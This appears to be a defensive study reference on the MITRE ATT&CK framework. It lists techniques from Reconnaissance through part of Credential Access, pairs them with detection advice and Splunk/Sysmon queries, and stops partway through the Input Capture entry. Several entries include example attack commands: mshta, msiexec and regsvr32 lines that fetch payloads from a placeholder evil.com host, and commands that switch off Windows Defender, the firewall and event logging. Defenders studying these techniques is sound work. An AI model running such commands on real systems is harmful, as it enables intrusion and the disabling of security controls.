# 04 - MITRE ATT&CK Framework
## Comprehensive TTP Reference for Detection & Response

---

## ATT&CK Matrix Overview

```
ENTERPRISE MATRIX (14 Tactics):
┌─────────────────────────────────────────────────────────────────────────────┐
│ Reconnaissance → Resource Dev → Initial Access → Execution → Persistence → │
│ Privilege Escalation → Defense Evasion → Credential Access → Discovery →   │
│ Lateral Movement → Collection → Command & Control → Exfiltration → Impact  │
└─────────────────────────────────────────────────────────────────────────────┘

ADDITIONAL MATRICES:
├── Mobile ATT&CK (iOS, Android)
├── ICS ATT&CK (Industrial Control Systems)
└── Cloud Matrix (subset focused on cloud)
```

---

## TA0043: Reconnaissance

```
ACTIVE SCANNING (T1595):
├── T1595.001: Scanning IP Blocks
├── T1595.002: Vulnerability Scanning
├── T1595.003: Wordlist Scanning
└── Detection: External scan logs, honeypot triggers

GATHER VICTIM INFORMATION:
├── T1589.001: Credentials (breach databases, paste sites)
├── T1589.002: Email Addresses (hunter.io, LinkedIn)
├── T1589.003: Employee Names
├── T1590.001: Domain Properties (WHOIS, DNS records)
├── T1590.002: DNS (zone transfers, subdomain enum)
├── T1590.004: Network Topology
├── T1590.005: IP Addresses
├── T1590.006: Network Security Appliances
└── T1591: Gather Victim Org Information

SEARCH OPEN TECHNICAL DATABASES (T1596):
├── T1596.001: DNS/Passive DNS
├── T1596.002: WHOIS
├── T1596.003: Digital Certificates (crt.sh, Censys)
├── T1596.004: CDNs (reveal origin IPs)
└── T1596.005: Scan Databases (Shodan, Censys)

SEARCH OPEN WEBSITES/DOMAINS (T1593):
├── T1593.001: Social Media
├── T1593.002: Search Engines (Google dorking)
├── T1593.003: Code Repositories (GitHub secrets)
└── Detection: Limited - focus on minimizing exposure

DETECTION STRATEGIES:
├── Monitor for scanning activity (IDS/firewall)
├── Honeypots for early warning
├── External attack surface monitoring
├── Brand monitoring services
└── GitHub secret scanning
```

---

## TA0042: Resource Development

```
ACQUIRE INFRASTRUCTURE (T1583):
├── T1583.001: Domains
│   └── Detection: Domain age, registration patterns, typosquatting
├── T1583.002: DNS Server
├── T1583.003: Virtual Private Server
├── T1583.004: Server
├── T1583.005: Botnet
├── T1583.006: Web Services (GitHub, Pastebin, cloud storage)
├── T1583.007: Serverless (Lambda, Azure Functions for C2)
└── T1583.008: Malvertising

COMPROMISE INFRASTRUCTURE (T1584):
├── T1584.001: Domains (hijacked legitimate domains)
├── T1584.002: DNS Server
├── T1584.003: Virtual Private Server
├── T1584.004: Server
├── T1584.005: Botnet
├── T1584.006: Web Services
└── T1584.007: Serverless

DEVELOP CAPABILITIES (T1587):
├── T1587.001: Malware
├── T1587.002: Code Signing Certificates
├── T1587.003: Digital Certificates
└── T1587.004: Exploits

OBTAIN CAPABILITIES (T1588):
├── T1588.001: Malware (purchasing/downloading)
├── T1588.002: Tool (Cobalt Strike, Metasploit)
├── T1588.003: Code Signing Certificates
├── T1588.004: Digital Certificates
├── T1588.005: Exploits
└── T1588.006: Vulnerabilities

STAGE CAPABILITIES (T1608):
├── T1608.001: Upload Malware
├── T1608.002: Upload Tool
├── T1608.003: Install Digital Certificate
├── T1608.004: Drive-by Target
├── T1608.005: Link Target
└── T1608.006: SEO Poisoning
```

---

## TA0001: Initial Access

```
DRIVE-BY COMPROMISE (T1189):
├── Mechanism: Exploit browser/plugin vulnerabilities
├── Delivery: Watering hole, malvertising
├── Detection:
│   ├── Proxy logs: Unusual iframe sources, exploit kit patterns
│   ├── Endpoint: Browser spawning child processes
│   └── Network: Connections to known exploit kit infrastructure
└── Splunk:
    index=proxy http_referrer=* uri_path IN ("*.jar","*.swf","*.class")
    | stats count by src_ip, dest_domain, uri_path

EXPLOIT PUBLIC-FACING APPLICATION (T1190):
├── Targets: Web apps, VPN, email gateways, firewalls
├── Common CVEs:
│   ├── ProxyShell/ProxyLogon (Exchange)
│   ├── Log4Shell (Log4j)
│   ├── Confluence RCE
│   ├── Citrix ADC
│   ├── FortiGate SSL VPN
│   ├── Pulse Secure VPN
│   └── MOVEit Transfer
├── Detection:
│   ├── WAF logs for exploit patterns
│   ├── Application error logs
│   ├── Unusual POST requests
│   └── Process creation from web servers
└── Splunk:
    index=web_logs http_method=POST
    | where len(http_body) > 10000 OR match(uri_path, "\.(php|asp|jsp)")
    | stats count by src_ip, uri_path, http_response_code

EXTERNAL REMOTE SERVICES (T1133):
├── Services: RDP, VPN, SSH, Citrix, VDI
├── Attack: Credential stuffing, brute force, leaked creds
├── Detection:
│   ├── Failed login spikes
│   ├── Successful login from unusual locations
│   ├── Login outside business hours
│   └── Multiple accounts from same IP
└── Splunk:
    index=vpn action=success
    | iplocation src_ip
    | where Country != "United States"
    | stats count values(Country) by user

PHISHING (T1566):
├── T1566.001: Spearphishing Attachment
│   ├── File types: Office macros, ISO/IMG, LNK, OneNote, HTML
│   ├── Detection: Email gateway, sandbox detonation
│   └── Endpoint: Office spawning cmd/powershell
├── T1566.002: Spearphishing Link
│   ├── Delivery: Credential harvesting, drive-by download
│   ├── Detection: URL reputation, newly registered domains
│   └── Proxy: Connections to typosquat domains
├── T1566.003: Spearphishing via Service
│   ├── Platforms: LinkedIn, Teams, Slack, Discord
│   └── Detection: SaaS audit logs
└── T1566.004: Spearphishing Voice (Vishing)

SUPPLY CHAIN COMPROMISE (T1195):
├── T1195.001: Compromise Software Dependencies
│   ├── Examples: SolarWinds, Codecov, ua-parser-js
│   └── Detection: SBOM monitoring, dependency scanning
├── T1195.002: Compromise Software Supply Chain
│   ├── Build system compromise
│   └── Detection: Binary reproducibility, code signing verification
└── T1195.003: Compromise Hardware Supply Chain

TRUSTED RELATIONSHIP (T1199):
├── Mechanism: Abuse MSP/vendor access
├── Examples: Kaseya VSA attack
├── Detection:
│   ├── Monitor third-party account activity
│   ├── Baseline vendor behavior
│   └── Alert on unusual access patterns
└── Splunk:
    index=auth user IN ("msp_*", "vendor_*")
    | stats dc(dest_host) as hosts_accessed by user
    | where hosts_accessed > 10

VALID ACCOUNTS (T1078):
├── T1078.001: Default Accounts
├── T1078.002: Domain Accounts
├── T1078.003: Local Accounts
├── T1078.004: Cloud Accounts
├── Detection:
│   ├── Impossible travel
│   ├── Login from new device/location
│   ├── Account used after long dormancy
│   └── Credential stuffing patterns
└── Splunk:
    index=auth action=success
    | iplocation src_ip
    | eventstats dc(Country) as country_count by user
    | where country_count > 2
```

---

## TA0002: Execution

```
COMMAND AND SCRIPTING INTERPRETER (T1059):
├── T1059.001: PowerShell
│   ├── Indicators:
│   │   ├── -EncodedCommand / -enc
│   │   ├── -ExecutionPolicy Bypass
│   │   ├── -WindowStyle Hidden
│   │   ├── IEX (Invoke-Expression)
│   │   ├── DownloadString / DownloadFile
│   │   ├── Reflection.Assembly
│   │   └── [Convert]::FromBase64String
│   ├── Events: 4104 (Script Block), Sysmon 1
│   └── Splunk:
│       index=windows EventCode=4104
│       | where match(ScriptBlockText, "(?i)(iex|invoke-expression|
│           downloadstring|frombase64|reflection\.assembly)")
│       | stats count values(ScriptBlockText) by Computer, UserName
│
├── T1059.002: AppleScript
├── T1059.003: Windows Command Shell (cmd.exe)
│   ├── Indicators: Chained commands, FOR loops, environment variables
│   └── Events: Sysmon 1, 4688
│
├── T1059.004: Unix Shell (bash, sh, zsh)
│   ├── Indicators: Reverse shells, encoded commands
│   └── Events: auditd execve, bash_history
│
├── T1059.005: Visual Basic (VBScript, VBA macros)
│   ├── Delivery: Office macros, .vbs files
│   ├── Events: Office spawning cmd/powershell
│   └── Splunk:
│       index=sysmon EventCode=1
│       | where ParentImage IN ("*\\WINWORD.EXE","*\\EXCEL.EXE",
│           "*\\POWERPNT.EXE","*\\OUTLOOK.EXE")
│       | where Image IN ("*\\cmd.exe","*\\powershell.exe",
│           "*\\wscript.exe","*\\cscript.exe","*\\mshta.exe")
│
├── T1059.006: Python
├── T1059.007: JavaScript (JScript, Node.js)
├── T1059.008: Network Device CLI
└── T1059.009: Cloud API

CONTAINER ADMINISTRATION COMMAND (T1609):
├── Mechanism: kubectl exec, docker exec
├── Detection: K8s audit logs, container runtime logs
└── Query:
    index=k8s verb="create" resource="pods/exec"
    | stats count by user.username, objectRef.name

DEPLOY CONTAINER (T1610):
├── Mechanism: Deploy malicious container
├── Indicators: Privileged containers, host mounts
└── Detection: K8s admission controllers, audit logs

EXPLOITATION FOR CLIENT EXECUTION (T1203):
├── Targets: Browsers, Office, PDF readers, media players
├── Detection: Application crashes, unusual child processes
└── Sysmon:
    index=sysmon EventCode=1
    | where ParentImage IN ("*\\AcroRd32.exe","*\\chrome.exe",
        "*\\firefox.exe","*\\iexplore.exe")
    | where Image IN ("*\\cmd.exe","*\\powershell.exe")

INTER-PROCESS COMMUNICATION (T1559):
├── T1559.001: Component Object Model (COM)
├── T1559.002: Dynamic Data Exchange (DDE)
│   └── Detection: Office with DDEAUTO fields
└── T1559.003: XPC Services (macOS)

NATIVE API (T1106):
├── Common APIs: NtCreateThread, NtMapViewOfSection, WriteProcessMemory
├── Detection: API hooking, ETW tracing
└── Indicators: Direct syscalls bypassing hooks

SCHEDULED TASK/JOB (T1053):
├── T1053.002: At
├── T1053.003: Cron
├── T1053.005: Scheduled Task
│   ├── Events: 4698 (created), 4702 (updated), Sysmon 1
│   └── Splunk:
│       index=windows EventCode=4698
│       | where NOT match(TaskName, "(Microsoft|Windows)")
│       | stats count by TaskName, User, Computer
├── T1053.006: Systemd Timers
└── T1053.007: Container Orchestration Job

SERVERLESS EXECUTION (T1648):
├── Platforms: Lambda, Azure Functions, Cloud Functions
├── Attack: Deploy malicious function for persistence/execution
├── Detection: Cloud audit logs, function deployment monitoring
└── CloudTrail:
    index=cloudtrail eventName IN ("CreateFunction", "UpdateFunctionCode",
        "UpdateFunctionConfiguration")
    | stats count by userIdentity.arn, requestParameters.functionName

SHARED MODULES (T1129):
├── Mechanism: Load malicious DLLs
├── Detection: Unsigned DLLs, unusual load paths
└── Sysmon Event 7

SOFTWARE DEPLOYMENT TOOLS (T1072):
├── Tools: SCCM, Intune, Puppet, Chef, Ansible
├── Attack: Abuse management tools for lateral movement
└── Detection: Baseline deployment activity

SYSTEM SERVICES (T1569):
├── T1569.001: Launchctl (macOS)
├── T1569.002: Service Execution
│   ├── Events: 7045 (service installed), 4697
│   └── Splunk:
│       index=windows EventCode=7045
│       | where ServiceType="user mode service"
│       | where NOT match(ImagePath, "C:\\Windows|C:\\Program Files")

USER EXECUTION (T1204):
├── T1204.001: Malicious Link
├── T1204.002: Malicious File
└── T1204.003: Malicious Image (container)

WINDOWS MANAGEMENT INSTRUMENTATION (T1047):
├── Local: wmic process call create
├── Remote: wmic /node:target process call create
├── Detection: WMI consumer/filter creation, WmiPrvSe spawning processes
└── Splunk:
    index=sysmon EventCode=1 ParentImage="*\\WmiPrvSE.exe"
    | where NOT Image IN ("*\\WmiPrvSE.exe","*\\scrcons.exe")
    | stats count by Image, CommandLine, User
```

---

## TA0003: Persistence

```
ACCOUNT MANIPULATION (T1098):
├── T1098.001: Additional Cloud Credentials
│   ├── AWS: Create access key for IAM user
│   ├── Azure: Add credentials to service principal
│   ├── GCP: Create service account key
│   └── CloudTrail:
│       index=cloudtrail eventName="CreateAccessKey"
│       | where userIdentity.arn != requestParameters.userName
│
├── T1098.002: Additional Email Delegate Permissions
│   └── O365: MailboxFolderPermission, InboxRule
│
├── T1098.003: Additional Cloud Roles
│   └── Detection: Monitor role assignments in cloud audit logs
│
├── T1098.004: SSH Authorized Keys
│   └── Linux:
│       index=linux source="/var/log/audit/audit.log"
│       | where syscall="write" AND key="authorized_keys"
│
├── T1098.005: Device Registration
│   └── Azure AD: Rogue device registration
│
└── T1098.006: Additional Container Cluster Roles
    └── K8s: ClusterRoleBinding creation

BOOT OR LOGON AUTOSTART EXECUTION (T1547):
├── T1547.001: Registry Run Keys / Startup Folder
│   ├── Keys:
│   │   ├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│   │   ├── HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│   │   ├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
│   │   └── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
│   ├── Startup Folder: shell:startup, shell:common startup
│   └── Sysmon:
│       index=sysmon EventCode=13
│       | where TargetObject="*\\CurrentVersion\\Run*"
│       | stats count by TargetObject, Details, Image
│
├── T1547.002: Authentication Package
│   └── Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
│
├── T1547.003: Time Providers
│   └── Registry: HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders
│
├── T1547.004: Winlogon Helper DLL
│   └── Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
│
├── T1547.005: Security Support Provider
│   └── Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
│
├── T1547.006: Kernel Modules and Extensions
├── T1547.008: LSASS Driver
├── T1547.009: Shortcut Modification
├── T1547.010: Port Monitors
├── T1547.012: Print Processors
├── T1547.013: XDG Autostart Entries (Linux)
├── T1547.014: Active Setup
└── T1547.015: Login Items (macOS)

BOOT OR LOGON INITIALIZATION SCRIPTS (T1037):
├── T1037.001: Logon Script (Windows)
├── T1037.002: Login Hook (macOS)
├── T1037.003: Network Logon Script
├── T1037.004: RC Scripts (Linux)
└── T1037.005: Startup Items

CREATE ACCOUNT (T1136):
├── T1136.001: Local Account
│   └── Windows: net user /add, New-LocalUser
│   └── Linux: useradd
├── T1136.002: Domain Account
│   └── AD: New-ADUser
└── T1136.003: Cloud Account
    └── AWS: CreateUser
    └── Azure: New-AzureADUser

CREATE OR MODIFY SYSTEM PROCESS (T1543):
├── T1543.001: Launch Agent (macOS)
├── T1543.002: Systemd Service
│   └── Detection: New .service files
├── T1543.003: Windows Service
│   └── Events: 7045, 4697, Sysmon 1
│   └── Splunk:
│       index=windows EventCode=7045
│       | where ServiceStartType="auto start"
│       | where NOT match(ImagePath, "C:\\Windows\\|C:\\Program Files")
└── T1543.004: Launch Daemon (macOS)

EVENT TRIGGERED EXECUTION (T1546):
├── T1546.001: Change Default File Association
├── T1546.002: Screensaver
├── T1546.003: Windows Management Instrumentation Event Subscription
│   ├── Components: __EventFilter + __EventConsumer + __FilterToConsumerBinding
│   ├── Events: Sysmon 19, 20, 21
│   └── Splunk:
│       index=sysmon EventCode IN (19,20,21)
│       | stats values(EventType) values(Destination) by User, Computer
│
├── T1546.004: Unix Shell Configuration Modification
│   └── Files: .bashrc, .bash_profile, .zshrc, /etc/profile
│
├── T1546.005: Trap (Unix signal handling)
├── T1546.007: Netsh Helper DLL
├── T1546.008: Accessibility Features
│   └── Binaries: sethc.exe, utilman.exe, osk.exe, magnify.exe
│   └── Attack: Replace with cmd.exe, trigger at login screen
│
├── T1546.009: AppCert DLLs
├── T1546.010: AppInit DLLs
├── T1546.011: Application Shimming
├── T1546.012: Image File Execution Options Injection
│   └── Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
│   └── Keys: Debugger, GlobalFlag
│
├── T1546.013: PowerShell Profile
│   └── Locations: $PROFILE, AllUsersAllHosts
│
├── T1546.014: Emond (macOS)
├── T1546.015: Component Object Model Hijacking
│   └── Registry: HKCU\SOFTWARE\Classes\CLSID\
└── T1546.016: Installer Packages

EXTERNAL REMOTE SERVICES (T1133) [also Initial Access]

HIJACK EXECUTION FLOW (T1574):
├── T1574.001: DLL Search Order Hijacking
├── T1574.002: DLL Side-Loading
├── T1574.004: Dylib Hijacking
├── T1574.005: Executable Installer File Permissions Weakness
├── T1574.006: Dynamic Linker Hijacking (LD_PRELOAD)
├── T1574.007: Path Interception by PATH Environment Variable
├── T1574.008: Path Interception by Search Order Hijacking
├── T1574.009: Path Interception by Unquoted Path
├── T1574.010: Services File Permissions Weakness
├── T1574.011: Services Registry Permissions Weakness
├── T1574.012: COR_PROFILER
└── T1574.013: KernelCallbackTable

IMPLANT INTERNAL IMAGE (T1525):
├── Mechanism: Backdoor container images in registry
├── Detection: Image scanning, signature verification
└── Query:
    index=container_registry action="push"
    | where NOT user IN ("ci-service", "build-system")

MODIFY AUTHENTICATION PROCESS (T1556):
├── T1556.001: Domain Controller Authentication
│   └── Skeleton Key: Patch LSASS to accept master password
│
├── T1556.002: Password Filter DLL
│   └── Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages
│
├── T1556.003: Pluggable Authentication Modules (PAM)
│   └── Linux: /etc/pam.d/, /lib/security/
│
├── T1556.004: Network Device Authentication
├── T1556.005: Reversible Encryption
├── T1556.006: Multi-Factor Authentication
├── T1556.007: Hybrid Identity
└── T1556.008: Network Provider DLL

OFFICE APPLICATION STARTUP (T1137):
├── T1137.001: Office Template Macros
├── T1137.002: Office Test
├── T1137.003: Outlook Forms
├── T1137.004: Outlook Home Page
├── T1137.005: Outlook Rules
└── T1137.006: Add-ins

PRE-OS BOOT (T1542):
├── T1542.001: System Firmware
├── T1542.002: Component Firmware
├── T1542.003: Bootkit
└── T1542.005: TFTP Boot

SCHEDULED TASK/JOB (T1053) [also Execution]

SERVER SOFTWARE COMPONENT (T1505):
├── T1505.001: SQL Stored Procedures
├── T1505.002: Transport Agent (Exchange)
├── T1505.003: Web Shell
│   ├── Indicators:
│   │   ├── New .aspx/.php/.jsp files in web directories
│   │   ├── Web server process spawning cmd/powershell
│   │   ├── HTTP POST to unusual file paths
│   │   └── Large response sizes from small files
│   └── Splunk:
│       index=sysmon EventCode=1
│       | where ParentImage IN ("*\\w3wp.exe","*\\httpd.exe",
│           "*\\nginx.exe","*\\apache2")
│       | where Image IN ("*\\cmd.exe","*\\powershell.exe")
│
├── T1505.004: IIS Components
└── T1505.005: Terminal Services DLL

TRAFFIC SIGNALING (T1205):
├── T1205.001: Port Knocking
└── T1205.002: Socket Filters

VALID ACCOUNTS (T1078) [also Initial Access]
```

---

## TA0004: Privilege Escalation

```
ABUSE ELEVATION CONTROL MECHANISM (T1548):
├── T1548.001: Setuid and Setgid
│   └── Linux: find / -perm -4000 -type f 2>/dev/null
│
├── T1548.002: Bypass User Account Control (UAC)
│   ├── Techniques:
│   │   ├── fodhelper.exe
│   │   ├── eventvwr.exe
│   │   ├── sdclt.exe
│   │   ├── computerdefaults.exe
│   │   └── DLL hijacking in auto-elevate apps
│   └── Detection: Registry modifications, process lineage
│
├── T1548.003: Sudo and Sudo Caching
│   └── Attack: sudo -l, CVE-2021-3156
│
├── T1548.004: Elevated Execution with Prompt
└── T1548.005: Temporary Elevated Cloud Access

ACCESS TOKEN MANIPULATION (T1134):
├── T1134.001: Token Impersonation/Theft
├── T1134.002: Create Process with Token
├── T1134.003: Make and Impersonate Token
├── T1134.004: Parent PID Spoofing
└── T1134.005: SID-History Injection

DOMAIN POLICY MODIFICATION (T1484):
├── T1484.001: Group Policy Modification
│   └── Detection: GPO changes in AD audit logs
└── T1484.002: Domain Trust Modification

ESCAPE TO HOST (T1611):
├── Mechanisms:
│   ├── Privileged container breakout
│   ├── Mounted docker socket
│   ├── Host path volume mounts
│   ├── Kernel exploits from container
│   └── CAP_SYS_ADMIN abuse
├── Detection:
│   ├── Container runtime logs
│   ├── Host process spawned by container
│   └── File access outside container rootfs
└── Query:
    index=container event.type="container_escape"
    | stats count by container.name, escape.method, host.name

EXPLOITATION FOR PRIVILEGE ESCALATION (T1068):
├── Windows Examples:
│   ├── PrintNightmare (CVE-2021-34527)
│   ├── HiveNightmare/SeriousSAM
│   ├── ZeroLogon (CVE-2020-1472)
│   └── PetitPotam
├── Linux Examples:
│   ├── Dirty COW (CVE-2016-5195)
│   ├── Dirty Pipe (CVE-2022-0847)
│   ├── PwnKit (CVE-2021-4034)
│   └── Baron Samedit (CVE-2021-3156)
└── Detection: Process crash, unusual privilege gain

PROCESS INJECTION (T1055):
├── T1055.001: Dynamic-link Library Injection
├── T1055.002: Portable Executable Injection
├── T1055.003: Thread Execution Hijacking
├── T1055.004: Asynchronous Procedure Call
├── T1055.005: Thread Local Storage
├── T1055.008: Ptrace System Calls
├── T1055.009: Proc Memory
├── T1055.011: Extra Window Memory Injection
├── T1055.012: Process Hollowing
│   ├── Indicators: Suspended process, NtUnmapViewOfSection
│   └── Sysmon: Event 8 (CreateRemoteThread), Event 10 (ProcessAccess)
├── T1055.013: Process Doppelganging
├── T1055.014: VDSO Hijacking
└── T1055.015: ListPlanting

Detection (Sysmon):
index=sysmon EventCode=8
| where SourceImage != TargetImage
| where NOT match(SourceImage, "csrss|wininit|lsass")
| stats count by SourceImage, TargetImage, SourceUser
```

---

## TA0005: Defense Evasion

```
ABUSE ELEVATION CONTROL MECHANISM (T1548) [also Priv Esc]

DEOBFUSCATE/DECODE FILES OR INFORMATION (T1140):
├── Methods: certutil -decode, base64, XOR
└── Detection: certutil with -decode, PowerShell FromBase64String

DEPLOY CONTAINER (T1610) [also Execution]

DIRECT VOLUME ACCESS (T1006):
├── Mechanism: Read disk directly, bypass file system
└── Tools: \\.\PhysicalDrive0, raw disk access

DOMAIN POLICY MODIFICATION (T1484) [also Priv Esc]

EXECUTION GUARDRAILS (T1480):
├── T1480.001: Environmental Keying
└── Purpose: Only execute if specific conditions met

EXPLOITATION FOR DEFENSE EVASION (T1211)

FILE AND DIRECTORY PERMISSIONS MODIFICATION (T1222):
├── T1222.001: Windows File and Directory Permissions Modification
│   └── Commands: icacls, takeown, cacls
└── T1222.002: Linux and Mac File and Directory Permissions Modification
    └── Commands: chmod, chown, chattr

HIDE ARTIFACTS (T1564):
├── T1564.001: Hidden Files and Directories
│   ├── Windows: attrib +h +s
│   ├── Linux: .filename (dot prefix)
│   └── Detection: File listing with hidden files
│
├── T1564.002: Hidden Users
├── T1564.003: Hidden Window
├── T1564.004: NTFS File Attributes
│   └── Alternate Data Streams: file.txt:hidden
│   └── Sysmon Event 15: FileCreateStreamHash
│
├── T1564.005: Hidden File System
├── T1564.006: Run Virtual Instance
├── T1564.007: VBA Stomping
├── T1564.008: Email Hiding Rules
├── T1564.009: Resource Forking
└── T1564.010: Process Argument Spoofing

HIJACK EXECUTION FLOW (T1574) [also Persistence]

IMPAIR DEFENSES (T1562):
├── T1562.001: Disable or Modify Tools
│   ├── Targets: AV, EDR, firewall
│   ├── Commands:
│   │   ├── Set-MpPreference -DisableRealtimeMonitoring $true
│   │   ├── sc stop WinDefend
│   │   ├── reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"
│   │   └── netsh advfirewall set allprofiles state off
│   └── Detection: Service stop events, registry modifications
│
├── T1562.002: Disable Windows Event Logging
│   ├── Commands: auditpol, wevtutil cl
│   └── Events: 1102 (Security log cleared)
│
├── T1562.003: Impair Command History Logging
│   └── Bash: unset HISTFILE, export HISTSIZE=0
│
├── T1562.004: Disable or Modify System Firewall
├── T1562.006: Indicator Blocking
├── T1562.007: Disable or Modify Cloud Firewall
├── T1562.008: Disable or Modify Cloud Logs
│   ├── AWS: StopLogging, DeleteTrail
│   ├── Azure: Delete diagnostic settings
│   └── GCP: Disable audit logs
│   └── CloudTrail:
│       index=cloudtrail eventName IN ("StopLogging","DeleteTrail",
│           "UpdateTrail","PutEventSelectors")
│
├── T1562.009: Safe Mode Boot
├── T1562.010: Downgrade Attack
└── T1562.011: Spoof Security Alerting

INDICATOR REMOVAL (T1070):
├── T1070.001: Clear Windows Event Logs
│   └── Events: 1102, 104
│   └── Splunk:
│       index=windows EventCode IN (1102, 104)
│       | stats count by Computer, User
│
├── T1070.002: Clear Linux or Mac System Logs
├── T1070.003: Clear Command History
├── T1070.004: File Deletion
├── T1070.005: Network Share Connection Removal
├── T1070.006: Timestomp
│   └── Sysmon Event 2: FileCreateTime changed
├── T1070.007: Clear Network Connection History and Configurations
├── T1070.008: Clear Mailbox Data
└── T1070.009: Clear Persistence

INDIRECT COMMAND EXECUTION (T1202):
├── Mechanism: Execute via pcalua, forfiles, SyncAppvPublishingServer
└── Detection: Unusual parent processes

MASQUERADING (T1036):
├── T1036.001: Invalid Code Signature
├── T1036.002: Right-to-Left Override
├── T1036.003: Rename System Utilities
├── T1036.004: Masquerade Task or Service
├── T1036.005: Match Legitimate Name or Location
│   ├── Examples: svchost.exe in wrong location
│   └── Detection: Hash mismatch, path verification
├── T1036.006: Space after Filename
├── T1036.007: Double File Extension
└── T1036.008: Masquerade File Type

MODIFY AUTHENTICATION PROCESS (T1556) [also Persistence]

MODIFY CLOUD COMPUTE INFRASTRUCTURE (T1578):
├── T1578.001: Create Snapshot
├── T1578.002: Create Cloud Instance
├── T1578.003: Delete Cloud Instance
├── T1578.004: Revert Cloud Instance
└── T1578.005: Modify Cloud Compute Configurations

MODIFY REGISTRY (T1112):
└── Detection: Sysmon Events 12, 13, 14

MODIFY SYSTEM IMAGE (T1601):
├── T1601.001: Patch System Image
└── T1601.002: Downgrade System Image

OBFUSCATED FILES OR INFORMATION (T1027):
├── T1027.001: Binary Padding
├── T1027.002: Software Packing
├── T1027.003: Steganography
├── T1027.004: Compile After Delivery
├── T1027.005: Indicator Removal from Tools
├── T1027.006: HTML Smuggling
│   └── Detection: Large HTML files, JavaScript blob creation
├── T1027.007: Dynamic API Resolution
├── T1027.008: Stripped Payloads
├── T1027.009: Embedded Payloads
├── T1027.010: Command Obfuscation
└── T1027.011: Fileless Storage

PLIST FILE MODIFICATION (T1647)

PRE-OS BOOT (T1542) [also Persistence]

PROCESS INJECTION (T1055) [also Priv Esc]

REFLECTIVE CODE LOADING (T1620):
├── Mechanism: Load code directly into memory
└── Tools: Reflective DLL injection, .NET Assembly.Load

ROGUE DOMAIN CONTROLLER (T1207):
└── DCShadow: Push changes to AD without legitimate DC

ROOTKIT (T1014):
├── Types: User-mode, kernel-mode, bootkit
└── Detection: Driver analysis, MBR/VBR inspection

SUBVERT TRUST CONTROLS (T1553):
├── T1553.001: Gatekeeper Bypass (macOS)
├── T1553.002: Code Signing
├── T1553.003: SIP and Trust Provider Hijacking
├── T1553.004: Install Root Certificate
├── T1553.005: Mark-of-the-Web Bypass
└── T1553.006: Code Signing Policy Modification

SYSTEM BINARY PROXY EXECUTION (T1218):
├── T1218.001: Compiled HTML File (CHM)
├── T1218.002: Control Panel
├── T1218.003: CMSTP
├── T1218.004: InstallUtil
├── T1218.005: Mshta
│   └── Command: mshta http://evil.com/payload.hta
├── T1218.007: Msiexec
│   └── Command: msiexec /q /i http://evil.com/payload.msi
├── T1218.008: Odbcconf
├── T1218.009: Regsvcs/Regasm
├── T1218.010: Regsvr32
│   └── Command: regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
├── T1218.011: Rundll32
├── T1218.012: Verclsid
├── T1218.013: Mavinject
├── T1218.014: MMC
└── Detection:
    index=sysmon EventCode=1
    | where Image IN ("*\\mshta.exe","*\\msiexec.exe","*\\regsvr32.exe",
        "*\\certutil.exe","*\\cmstp.exe","*\\rundll32.exe")
    | where match(CommandLine, "http|//|\\\\\\\\")

SYSTEM SCRIPT PROXY EXECUTION (T1216):
├── T1216.001: PubPrn
└── T1216.002: SyncAppvPublishingServer

TEMPLATE INJECTION (T1221):
└── Office remote template loading

TRAFFIC SIGNALING (T1205) [also Persistence]

TRUSTED DEVELOPER UTILITIES PROXY EXECUTION (T1127):
├── T1127.001: MSBuild
└── Detection: MSBuild spawning unusual processes

UNUSED/UNSUPPORTED CLOUD REGIONS (T1535):
└── Deploy resources in regions without monitoring

USE ALTERNATE AUTHENTICATION MATERIAL (T1550):
├── T1550.001: Application Access Token
├── T1550.002: Pass the Hash
│   ├── Mechanism: Use NTLM hash without cracking
│   ├── Detection: NTLM auth from unusual sources
│   └── Events: 4624 with NTLM, no 4648 prior
├── T1550.003: Pass the Ticket
│   ├── Mechanism: Use Kerberos ticket
│   └── Detection: TGT from non-issuing DC
├── T1550.004: Web Session Cookie
└── T1550.005: Registered Device with Azure AD

VIRTUALIZATION/SANDBOX EVASION (T1497):
├── T1497.001: System Checks
├── T1497.002: User Activity Based Checks
└── T1497.003: Time Based Evasion

WEAKEN ENCRYPTION (T1600):
├── T1600.001: Reduce Key Space
└── T1600.002: Disable Crypto Hardware

XSL SCRIPT PROCESSING (T1220):
└── Command: wmic /format:evil.xsl
```

---

## TA0006: Credential Access

```
ADVERSARY-IN-THE-MIDDLE (T1557):
├── T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay
│   ├── Tools: Responder, Inveigh
│   └── Detection: LLMNR/NBT-NS queries, unusual SMB auth
├── T1557.002: ARP Cache Poisoning
├── T1557.003: DHCP Spoofing
└── T1557.004: LDAP Spoofing (ESC8/ADCS Relay)

BRUTE FORCE (T1110):
├── T1110.001: Password Guessing
├── T1110.002: Password Cracking
├── T1110.003: Password Spraying
│   ├── Detection: Same password, many users
│   └── Events: 4625 with same password hash
├── T1110.004: Credential Stuffing
└── Detection:
    index=windows EventCode=4625
    | bucket span=5m _time
    | stats dc(TargetUserName) as unique_users count by IpAddress, _time
    | where unique_users > 10

CREDENTIALS FROM PASSWORD STORES (T1555):
├── T1555.001: Keychain
├── T1555.002: Securityd Memory
├── T1555.003: Credentials from Web Browsers
│   └── Locations: Chrome Login Data, Firefox logins.json
├── T1555.004: Windows Credential Manager
├── T1555.005: Password Managers
└── T1555.006: Cloud Secrets Management Services

EXPLOITATION FOR CREDENTIAL ACCESS (T1212):
└── Examples: ProxyLogon, PrintNightmare (credential dump)

FORCED AUTHENTICATION (T1187):
├── Mechanisms: UNC path injection, WebDAV
└── Tools: PetitPotam, Farmer/Crop

FORGE WEB CREDENTIALS (T1606):
├── T1606.001: Web Cookies
├── T1606.002: SAML Tokens
│   └── Golden SAML: Forge tokens with signing key
└── Detection: Token claims validation, signing key audit

INPUT CAPTURE (T1056):
├── T1056.001: Keylogging
